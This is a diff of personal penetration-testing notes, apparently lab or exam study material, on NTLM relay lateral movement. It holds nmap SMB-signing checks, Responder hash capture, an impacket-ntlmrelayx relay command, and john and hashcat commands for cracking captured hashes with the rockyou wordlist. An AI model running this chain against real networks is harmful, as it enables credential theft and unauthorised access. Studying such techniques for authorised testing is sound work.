@@ -1,4 +1,10 @@
-Lateral movement technique 
+Lateral movement technique
+
+You pretend to be MS02, to trick MS01 who has the password to MS02 to send the password over so you can catch it.
+
+so I am company A. When someone auditor tries to enter my company today with his company keycard, I sneakily make a copy of his keycard. This auditor also has access to company B. So with his keycard i can also access company b temporarily. I do not make the keycard permanently. I am only borrowing a snapshot of his keycard
+
+You are relaying MS01 to MS02
 
 **Check SMB Signing Status:**
 
@@ -15,17 +21,31 @@ nmap -Pn -p445 --script smb2-security-mode <target_IP>
 
 - Look for hosts where `SMB Signing: False` (or not required). Workstations typically have signing disabled by default, whereas Domain Controllers enforce it globally.
 
-Relay the hash
+Relay the hash (TARGET THE MACHINE TO RELAY TO)
 ```
-sudo impacket-ntlmrelayx -t {MS01_RECEIVER_IP} -smb2support -debug --no-http-server
+sudo impacket-ntlmrelayx -t {MS02_RECEIVER_IP} -smb2support -debug --no-http-server
 ```
 
-and
+OR
 
 Capture the hash
 ```
 sudo responder -I tun0 -dwv
 ```
+
+---
+
+```
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+or
+
+```
+hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+---
 
 Go onto MSSQL 
 ```dataviewjs
